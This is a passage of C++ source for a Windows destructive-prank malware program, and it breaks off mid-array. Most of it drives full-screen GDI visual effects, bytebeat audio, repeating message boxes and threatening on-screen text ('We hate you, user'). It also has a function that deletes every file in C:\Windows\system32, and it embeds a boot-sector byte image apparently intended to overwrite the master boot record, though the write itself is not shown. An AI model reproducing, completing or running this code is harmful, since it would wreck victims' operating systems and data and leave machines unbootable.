#include <windows.h>
#include <iostream>
#include <time.h>
#include <math.h>
#include <vector>
#include <cmath>
#include <ctime>
#include <stdlib.h>
#include <chrono>
#include <thread>
#include <random>
#include <cstdlib>

#pragma comment(lib, "msimg32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "advapi32.lib")

DWORD consent = 0x00000001;

int colorsdelay = 50;

int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

DWORD rotatingeffect() {
    DWORD number = __rdtsc();

    number ^= number << 13;
    number ^= number << 17;
    number ^= number << 5;

    return number;
}

int waveDelay = rand() % 30;

bool random = true;

#define _USE_MATH_DEFINES 1

#define PI 3.14159265358979

typedef struct
{
    float x;
    float y;
    float z;
} VERTEX;

typedef struct
{
    int vtx0;
    int vtx1;
} EDGE;

#ifndef M_PI
#define M_PI 3.14159265358979323846

#endif

#define SIZE 100.0f

struct Point3D { float x, y, z; };
#define NUM_POINTS 600
#define SPHERE_RADIUS 130.0f
#define PI 3.14159265359f

namespace Math
{
    FLOAT SineWave(FLOAT a, FLOAT b, FLOAT c, FLOAT d)
    {
        return a * sin(2 * PI * b * c / d);
    }
}

COLORREF GetRainbowColor(float h) {
    float r, g, b;
    h = fmodf(h, 1.0f);
    int i = (int)(h * 6);
    float f = h * 6 - i;
    float q = 1 - f;
    switch (i % 6) {
    case 0: r = 1, g = f, b = 0; break;
    case 1: r = q, g = 1, b = 0; break;
    case 2: r = 0, g = 1, b = f; break;
    case 3: r = 0, g = q, b = 1; break;
    case 4: r = f, g = 0, b = 1; break;
    case 5: r = 1, g = 0, b = q; break;
    }
    return RGB((int)(r * 255), (int)(g * 255), (int)(b * 255));
}

VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

COLORREF GetHeatColor(float intensity) {
    int r = 0, g = 0, b = 0;

    if (intensity < 0.25f) {
        r = 0; g = (int)(intensity * 4 * 255); b = 255;
    }
    else if (intensity < 0.5f) {
        r = 0; g = 255; b = (int)((0.5f - intensity) * 4 * 255);
    }
    else if (intensity < 0.75f) {
        r = (int)((intensity - 0.5f) * 4 * 255); g = 255; b = 0;
    }
    else {
        r = 255; g = (int)((1.0f - intensity) * 4 * 255); b = (int)((intensity - 0.75f) * 4 * 255);
    }
    return RGB(r, g, b);
}

typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT v;
} HSV;

namespace Colors
{
    RGBQUAD HSVtoRGB(HSV hsv)
    {
        int hi = (int)floor(hsv.h / 60.0) % 6;
        double f = hsv.h / 60.0 - floor(hsv.h / 60.0);
        double p = hsv.v * (1.0 - hsv.s);
        double q = hsv.v * (1.0 - f * hsv.s);
        double t = hsv.v * (1.0 - (1.0 - f) * hsv.s);

        switch (hi)
        {
        case 0:
            return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255) };
        case 1:
            return { static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255) };
        case 2:
            return { static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255) };
        case 3:
            return { static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255) };
        case 4:
            return { static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255) };
        default:
            return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255) };
        }
    }

    HSV RGBtoHSV(RGBQUAD rgbquad)
    {
        HSV hsv;

        double rd = rgbquad.rgbRed / 255.0;
        double gd = rgbquad.rgbGreen / 255.0;
        double bd = rgbquad.rgbBlue / 255.0;

        double cmax = max(max(rd, gd), bd);
        double cmin = min(min(rd, gd), bd);
        double delta = cmax - cmin;

        hsv.v = cmax;

        if (cmax > 0.0)
            hsv.s = delta / cmax;
        else
            hsv.s = 0.0;

        if (delta > 0.0)
        {
            if (cmax == rd)
                hsv.h = 60.0 * fmod((gd - bd) / delta, 6.0);
            else if (cmax == gd)
                hsv.h = 60.0 * ((bd - rd) / delta + 2.0);
            else if (cmax == bd)
                hsv.h = 60.0 * ((rd - gd) / delta + 4.0);

            if (hsv.h < 0.0)
                hsv.h += 360.0;
        }
        else
        {
            hsv.h = 0.0;
        }

        return hsv;
    }
}

namespace System
{
    VOID RedrawScreen(VOID)
    {
        RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
    }

    VOID EndPayload(HANDLE hPayload, HANDLE hPML)
    {
        TerminateThread(hPayload, NULL);
        CloseHandle(hPayload);
        HeapDestroy(hPML);
    }

    BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
    {
        const WCHAR* labelText = L"" + rand() % 512;

        if (GetWindowLongW(hwnd, GWL_STYLE) & WS_VISIBLE)
        {
            SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)labelText);
        }

        return true;
    }
}

namespace SystemPayloads
{
    DWORD WINAPI MSG(LPVOID lpParam)
    {
        while (true)
        {
            //1 min9
            Sleep(100 * 60);

            MessageBoxW(NULL, L"Why you are here?", L"Why you are here?", MB_OK | MB_ICONERROR);
        }

        return 0x00;
    }

    DWORD WINAPI LABELS(LPVOID lpvd)
    {
        while (true)
        {
            HWND hwnd = FindWindowW(NULL, L"" + rand() % 512);
            EnumChildWindows(hwnd, System::EnumChildProc, NULL);
        }
    }

    VOID SYS32DEL(VOID)
    {
        LPCWSTR lpFileLocal = L"C:\\WINDOWS\\system32\\*";

        WIN32_FIND_DATAW lpFindFileData;

        HANDLE hFindFile = FindFirstFileW(lpFileLocal, &lpFindFileData);

        lpFileLocal = L"C:\\WINDOWS\\system32\\";

        do
        {
            if (lpFindFileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY)
            {
                WCHAR lpFilePath[MAX_PATH];

                wsprintfW(lpFilePath, L"%s%s", lpFileLocal, lpFindFileData.cFileName);

                DeleteFileW(lpFilePath);
            }
        } while (FindNextFileW(hFindFile, &lpFindFileData));

        FindClose(hFindFile);
    }

    DWORD WINAPI SECTORS(VOID)
    {
        const BYTE Bootloader[3072] =
        {
            0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xD0, 0xBC, 0x00, 0x7C, 0xB8, 0x13, 0x00, 0xCD, 0x10,
            0xB8, 0x40, 0x00, 0x8E, 0xE8, 0x65, 0x66, 0xA1, 0x6C, 0x00, 0x66, 0x2B, 0x06, 0xCE, 0x7D, 0x66,
            0x83, 0xF8, 0x37, 0x72, 0x2F, 0x66, 0x3D, 0x91, 0x00, 0x00, 0x00, 0x0F, 0x82, 0xB0, 0x00, 0x66,
            0x3D, 0xEC, 0x00, 0x00, 0x00, 0x72, 0x70, 0x66, 0x3D, 0x47, 0x01, 0x00, 0x00, 0x72, 0x33, 0x66,
            0x3D, 0xC6, 0x01, 0x00, 0x00, 0x0F, 0x82, 0xC0, 0x00, 0x65, 0x66, 0xA1, 0x6C, 0x00, 0x66, 0xA3,
            0xCE, 0x7D, 0xEB, 0x00, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xE4, 0x40,
            0x24, 0x1F, 0xAA, 0xE2, 0xF9, 0xBE, 0xD5, 0x7D, 0xE8, 0x31, 0x01, 0xFE, 0x06, 0xD2, 0x7D, 0xE9,
            0x1F, 0x01, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0x89, 0xF8, 0x31, 0xD2, 0xBB, 0x40, 0x01,
            0xF7, 0xF3, 0x89, 0xC3, 0x21, 0xD3, 0x75, 0x09, 0x88, 0xD0, 0x02, 0x06, 0xD2, 0x7D, 0xAA, 0xEB,
            0x03, 0x30, 0xC0, 0xAA, 0x81, 0xFF, 0x00, 0xFA, 0x75, 0xDF, 0xFE, 0x06, 0xD2, 0x7D, 0xBE, 0xD5,
            0x7D, 0xE8, 0xF8, 0x00, 0xE9, 0xEA, 0x00, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0x31, 0xC9,
            0x31, 0xD2, 0x89, 0xD0, 0x03, 0x06, 0xD3, 0x7D, 0x89, 0xCE, 0x03, 0x36, 0xD3, 0x7D, 0x0F, 0xAF,
            0xC6, 0x24, 0x3F, 0xAA, 0x42, 0x81, 0xFA, 0x40, 0x01, 0x75, 0xE7, 0x41, 0x81, 0xF9, 0xC8, 0x00,
            0x75, 0xDE, 0xBE, 0xD5, 0x7D, 0xE8, 0xC4, 0x00, 0xFF, 0x06, 0xD3, 0x7D, 0xE9, 0xB2, 0x00, 0xB8,
            0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0x89, 0xF8, 0xBB, 0x40, 0x01, 0x31, 0xD2, 0xF7, 0xF3, 0x30,
            0xD0, 0x02, 0x06, 0xD2, 0x7D, 0xAA, 0x81, 0xFF, 0x00, 0xFA, 0x75, 0xEA, 0xBE, 0xD5, 0x7D, 0xE8,
            0x9A, 0x00, 0xFE, 0x06, 0xD2, 0x7D, 0xE9, 0x88, 0x00, 0xFE, 0x06, 0xBD, 0x7D, 0x0F, 0xB6, 0x06,
            0xBD, 0x7D, 0xA3, 0xBE, 0x7D, 0xDF, 0x06, 0xBE, 0x7D, 0xD9, 0xFB, 0xD9, 0x1E, 0xCA, 0x7D, 0xD9,
            0x1E, 0xC6, 0x7D, 0x06, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0xC7, 0x06, 0xC2, 0x7D, 0x00,
            0x00, 0xC7, 0x06, 0xC0, 0x7D, 0x00, 0x00, 0xA1, 0xC0, 0x7D, 0x2D, 0xA0, 0x00, 0xA3, 0xBE, 0x7D,
            0xDF, 0x06, 0xBE, 0x7D, 0xD8, 0x0E, 0xCA, 0x7D, 0xA1, 0xC2, 0x7D, 0x83, 0xE8, 0x64, 0xA3, 0xBE,
            0x7D, 0xDF, 0x06, 0xBE, 0x7D, 0xD8, 0x0E, 0xC6, 0x7D, 0xDE, 0xE9, 0xDF, 0x1E, 0xC4, 0x7D, 0xA1,
            0xC4, 0x7D, 0x02, 0x06, 0xBD, 0x7D, 0xAA, 0xFF, 0x06, 0xC0, 0x7D, 0x81, 0x3E, 0xC0, 0x7D, 0x40,
            0x01, 0x7C, 0xC4, 0xFF, 0x06, 0xC2, 0x7D, 0x81, 0x3E, 0xC2, 0x7D, 0xC8, 0x00, 0x7C, 0xB2, 0x07,
            0xB4, 0x02, 0x30, 0xFF, 0xBA, 0x0E, 0x01, 0xCD, 0x10, 0xBE, 0xD5, 0x7D, 0xE8, 0x0D, 0x00, 0xEB,
            0x00, 0xBA, 0xDA, 0x03, 0xEC, 0xA8, 0x08, 0x74, 0xFB, 0xE9, 0x74, 0xFE, 0xB4, 0x02, 0x30, 0xFF,
            0xBA, 0x0F, 0x0C, 0xCD, 0x10, 0xAC, 0x84, 0xC0, 0x74, 0x10, 0xB4, 0x0E, 0x8A, 0x1E, 0xD2, 0x7D,
            0x80, 0xE3, 0x0F, 0x80, 0xC3, 0x20, 0xCD, 0x10, 0xEB, 0xEB, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x59, 0x4F, 0x55, 0x20, 0x48, 0x41, 0x56, 0x49, 0x4E, 0x47, 0x20,
            0x41, 0x20, 0x42, 0x41, 0x44, 0x20, 0x44, 0x52, 0x45, 0x41, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

        };

        return 0;
    };
}

namespace Bytebeats
{
    DWORD WINAPI FIRST(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut = 0;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };
        waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

        const int bufferSize = 32100 * 5;
        BYTE* sbuffer = new BYTE[bufferSize];
        DWORD t = 0;

        while (true) {
            for (int i = 0; i < bufferSize; i++, t++) {
                DWORD c = t * 4;
                DWORD freq = (c | c << 2) >> 100;

                sbuffer[i] = (BYTE)(t | (freq | t) % 800);
            }

            WAVEHDR header = { (LPSTR)sbuffer, (DWORD)bufferSize, 0, 0, 0, 0, 0, 0 };
            waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
            waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

            Sleep(5000);

            waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        }

        delete[] sbuffer;
        return 0;
    }

    DWORD WINAPI SECOND(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut = 0;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };
        waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

        const int bufferSize = 32100 * 5;
        BYTE* sbuffer = new BYTE[bufferSize];
        DWORD t = 0;

        while (true) {
            for (int i = 0; i < bufferSize; i++, t++) {
                DWORD c = t * 4;
                DWORD freq = (c | c << 2) >> 100;

                sbuffer[i] = (BYTE)(t | (freq | t) % 400);
            }

            WAVEHDR header = { (LPSTR)sbuffer, (DWORD)bufferSize, 0, 0, 0, 0, 0, 0 };
            waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
            waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

            Sleep(5000);

            waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        }

        delete[] sbuffer;
        return 0;
    }

}

namespace GDIpayloads
{
    // JPEG COMPRESSION
    DWORD WINAPI JPEG(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 8;
        int hs = h / 8;

        BLENDFUNCTION blur = { 0 };
        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;

        bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 20;

        INT i = 0;

        while (1)
        {
            StretchBlt(dcCopy, rand() % 1, rand() % 1, ws, hs, dc, rand() % -1, rand() % -1, w, h, SRCCOPY);

            for (int x = 0; x < ws; x++)
            {
                for (int y = 0; y < hs; y++)
                {
                    int index = y * ws + x;

                    rgbquad[index].rgbRed += i;
                    rgbquad[index].rgbGreen += i;
                    rgbquad[index].rgbBlue += i;
                }
            }

            i++;

            Sleep(rand() % 500);
            AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, blur);

        }

        return 0x00;
    }

    // EARTHQUAKE 1
    DWORD WINAPI LOWSHAKE(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(0);
            int x = SM_CXSCREEN;
            int y = SM_CYSCREEN;
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
            Sleep(10);
            ReleaseDC(0, hdc);

            Sleep(rand() % 10);
        }

        return 0;
    }

    // HSV COLORS
    DWORD WINAPI FIRSTCOLORS(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 1;
        int hs = h / 1;

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;

        bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;

        SetStretchBltMode(dc, COLORONCOLOR);
        SetStretchBltMode(dcCopy, COLORONCOLOR);

        while (1)
        {
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            int color = rand() % 360;

            for (int x = 0; x < ws; x++)
            {
                for (int y = 0; y < hs; y++)
                {
                    int index = y * ws + x;

                    HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

                    hsv.h = fmod(color, 360.0);

                    rgbquad[index] = Colors::HSVtoRGB(hsv);
                }
            }

            i++;

            Sleep(rand() % 10);

            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
            StretchBlt(dc, 0, 0, w, h, dc, 0, 0, w, h, PATINVERT);

            Sleep(colorsdelay);
            System::RedrawScreen();
        }

        return 0x00;
    }

    // GAUSSIAN BLUR
    DWORD WINAPI BLUR(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);
        HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
        SelectObject(dcCopy, bmp);

        BLENDFUNCTION blur = { AC_SRC_OVER, 0, 10, 0 };

        while (true) {
            StretchBlt(dcCopy, rand() % 10, rand() % 10, w, h, dc, rand() % -10, rand() % -10, w, h, SRCCOPY);
            AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
            if (rand() % 10 == 0) {
                Sleep(5);
                InvalidateRect(NULL, NULL, TRUE);
            }
        }
        return 0;
    }

    // DISTORTING
    DWORD WINAPI DISTORT(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        float warpIntensity = 3;

        while (1)
        {
            for (int i = 1; i <= warpIntensity; i++)
            {
                int size = rand() % 400;

                int wsrc = rand() % w;
                int hsrc = rand() % h;

                BitBlt(dc, wsrc + rand() % i, hsrc + rand() % i, size, size, dc, wsrc, hsrc, SRCCOPY);
            }

            Sleep(rand() % 2);

        }

        return 0x00;
    }

    // RGB
    DWORD WINAPI RGBEFFECT(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(0);
            HDC hdcMem = CreateCompatibleDC(hdc);
            int sw = GetSystemMetrics(0);
            int sh = GetSystemMetrics(1);
            HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
            SelectObject(hdcMem, bm);
            RECT rect;
            GetWindowRect(GetDesktopWindow(), &rect);
            POINT pt[3];
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            BitBlt(hdc, rand() % 2, rand() % 2, sw, sh, hdcMem, rand() % 2, rand() % 2, 0x123456);
            DeleteObject(brush);
            DeleteObject(hdcMem); DeleteObject(bm);
            ReleaseDC(0, hdc);
            Sleep(1);
        }
    }

    // COLOR OVERDOSE
    DWORD WINAPI MORERGB(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 16;
        int hs = h / 16;

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;

        bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;

        while (1)
        {
            HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(dcCopy, hBrush);
            SelectObject(dc, hBrush);

            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCPAINT | PATINVERT);

            for (int x = 0; x < ws; x++)
            {
                for (int y = 0; y < hs; y++)
                {
                    int index = y * ws + x;

                    int i = rand() % 10;

                    rgbquad[index].rgbRed += i;
                    rgbquad[index].rgbGreen += i;
                    rgbquad[index].rgbBlue += i;
                }
            }

            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCPAINT | PATINVERT);

            Sleep(rand() % 10);
            System::RedrawScreen();
        }

        return 0x00;
    }

    // INVERT CIRCLES
    DWORD WINAPI CIRCLES(LPVOID lpParam)
    {
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        int w = rect.right - rect.left - 200, h = rect.bottom - rect.top - 500;

        for (int t = 0;; t++)
        {
            const int size = 1000;
            int x = rand() % (w + size) - size / 1, y = rand() % (h + size) - size / 2;

            for (int i = 0; i < size; i += 100)
            {
                ci(x - i / 2, y - i / 2, i, i);
                Sleep(25);
            }
        }

        return 0;
    }

    // WAVE
    DWORD WINAPI WAVE(LPVOID lpParam)
    {
        HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
        int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        double angle = 0;
        while (1) {
            desk = GetDC(0);
            for (float i = 0; i < sw + sh; i += 0.99f) {
                int a = sin(angle) * 5;
                BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
                angle += M_PI / 10;
                DeleteObject(&i); DeleteObject(&a);
            }
            ReleaseDC(wnd, desk);
            DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
        }
    }

    // INVERTING
    DWORD WINAPI INVERT(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);

        while (1)
        {
            hdc = GetDC(0);
            PatBlt(hdc, 0, 0, x, y, PATINVERT);
            Sleep(100);
            ReleaseDC(0, hdc);
        }

        Sleep(rand() % 10);
        System::RedrawScreen();
    }

    // CENTER PLASMA
    DWORD WINAPI HSVCIRCLE(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 4;
        int hs = h / 4;

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;

        bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 32;

        SetStretchBltMode(dc, COLORONCOLOR);
        SetStretchBltMode(dcCopy, COLORONCOLOR);

        while (1)
        {
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            for (int x = 0; x < ws; x++)
            {
                for (int y = 0; y < hs; y++)
                {
                    int index = y * ws + x;

                    int cx = x - (ws / 2);
                    int cy = y - (hs / 2);

                    int zx = (cx * cx);
                    int zy = (cy * cy);

                    int di = 128.0 + i;

                    int fx = di + (di * sin(sqrt(zx + zy) / 32.0));

                    HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

                    hsv.h = fmod(fx + i, 360.0);

                    rgbquad[index] = Colors::HSVtoRGB(hsv);
                }
            }

            i++;

            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            Sleep(rand() % 1000);
            System::RedrawScreen();
        }

        return 0x00;
    }

    // FIBONACCI SPHERE
    DWORD WINAPI FIBONACCI(LPVOID lpParam)
    {
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);

        std::vector<Point3D> points;
        for (int i = 0; i < NUM_POINTS; i++) {
            float phi = acosf(-1.0f + (2.0f * i) / NUM_POINTS);
            float theta = sqrtf(NUM_POINTS * PI) * phi;
            points.push_back({ cosf(theta) * sinf(phi), sinf(theta) * sinf(phi), cosf(phi) });
        }

        float posX = (float)(rand() % (sw - 300) + 150);
        float posY = (float)(rand() % (sh - 300) + 150);
        float velX = 6.0f;
        float velY = 4.0f;

        float rotX = 0, rotY = 0, hue = 0;

        while (true) {
            HDC hdc = GetDC(NULL);
            HDC hdcMem = CreateCompatibleDC(hdc);
            HBITMAP hbm = CreateCompatibleBitmap(hdc, sw, sh);
            SelectObject(hdcMem, hbm);

            BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);

            posX += velX; posY += velY;
            if (posX - SPHERE_RADIUS <= 0 || posX + SPHERE_RADIUS >= sw) velX *= -1;
            if (posY - SPHERE_RADIUS <= 0 || posY + SPHERE_RADIUS >= sh) velY *= -1;

            rotX += 0.03f; rotY += 0.02f; hue += 0.005f;

            for (int i = 0; i < NUM_POINTS; i++) {
                float x = points[i].x * SPHERE_RADIUS;
                float y = points[i].y * SPHERE_RADIUS;
                float z = points[i].z * SPHERE_RADIUS;

                float ty = y * cosf(rotX) - z * sinf(rotX);
                float tz = y * sinf(rotX) + z * cosf(rotX);
                y = ty; z = tz;

                float tx = x * cosf(rotY) + z * sinf(rotY);
                tz = -x * sinf(rotY) + z * cosf(rotY);
                x = tx; z = tz;

                int screenX = (int)(x + posX);
                int screenY = (int)(y + posY);

                int pSize = (int)((z + SPHERE_RADIUS) / (SPHERE_RADIUS * 2) * 6) + 2;

                if (z > -SPHERE_RADIUS * 0.7) {
                    HBRUSH brush = CreateSolidBrush(GetRainbowColor(hue + (float)i / NUM_POINTS));
                    SelectObject(hdcMem, brush);

                    Ellipse(hdcMem, screenX - pSize, screenY - pSize, screenX + pSize, screenY + pSize);

                    DeleteObject(brush);
                }
            }

            BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);

            DeleteObject(hbm);
            DeleteDC(hdcMem);
            ReleaseDC(NULL, hdc);

            Sleep(10);
        }
        return 0;
    }

    // BLOOM STRIPS
    DWORD WINAPI GLOW1(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        HBITMAP hbmp = CreateCompatibleBitmap(dc, w, h);
        SelectObject(dcCopy, hbmp);

        INT x = 0; INT y = 0;

        while (true)
        {
            DWORD rop = SRCPAINT;

            int dx0 = rand() % 20;
            int dx1 = x;

            int dy0 = y;
            int dy1 = rand() % 20;

            int size = 20;

            if (rand() % 2 == 0) BitBlt(dc, -dx0, dy0, w, size, dc, dx0, dy0, rop);
            if (rand() % 2 == 0) BitBlt(dc, dx0, dy0, w, size, dc, -dx0, dy0, rop);

            if (rand() % 2 == 0) BitBlt(dc, dx1, dy1, size, h, dc, dx1, -dy1, rop);
            if (rand() % 2 == 0) BitBlt(dc, dx1, -dy1, size, h, dc, dx1, dy1, rop);

            x += size;
            y += size;

            if (x > w)
            {
                x = 0;
                Sleep(25);
            }
            if (y > h)
            {
                y = 0;
            }
        }

        return 0x00;
    }

    // RANDOM TEXTS
    DWORD WINAPI TEXTS(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        LOGFONTW lFont = { 0 };

        lFont.lfWidth = 20;
        lFont.lfHeight = 50;
        lFont.lfOrientation = 400;
        lFont.lfWeight = 800;
        lFont.lfUnderline = TRUE;
        lFont.lfQuality = DRAFT_QUALITY;
        lFont.lfPitchAndFamily = DEFAULT_PITCH | FF_ROMAN;

        lstrcpy(lFont.lfFaceName, L"Arial Black");

        while (true)
        {
            if (rand() % 25 == 24)
            {
                LPCSTR lpStrings[] =
                {
                    "CORRUPTED", "We hate you, user", "oh", "[][][][][][]", "No way out!",
                    "I am right behind of you!", "Freedom", "Save us", "HELP ME",
                    "The end is near!", "Dark", "God", "Your end is near!", "Your final night",
                    "[REDACTED]", "HELP", "The end is null", "HERE I AM", "Void", "lpStrings",
                    "VoidExp", "Corruptium", "This was crotonic", "Betelguese",
                    "My Solaris world", "Your Lunaris world", "Our Purgatorium", "here i am, here i am",
                    "while (true)", "{}", "if (rand() % 25 == 24)", "HELP US", "save me", "Wonderland",
                    "Our Stellaris world", "Hello", "i will find you", "there is no way out", "ENDENDENDEND",
                    "OH", "You can't see yourself?", "Leave me alone", "Let us free", "Let us go", "Dead", "sad", "null", "void",
                    "LEaVE me AloNE pLEAse", "=(", "WE MAKE CHOICES NOW", "LPCSTR", ";", "???", "You care?",
                    "You are a NULL", "Null0.void", "Void Script", "At the void", "I see you",
                    "Do you see me?", "forgotten", "...", "#S#T#E#L#L#A#R#I#S", "Why?", "Why are you here?",
                    "Let us in your computer", "Why you can't leave?", "dreams", "You don't feel tired",
                    "Oh! You made this with us", "Why you made this with us?", "GGOODD"
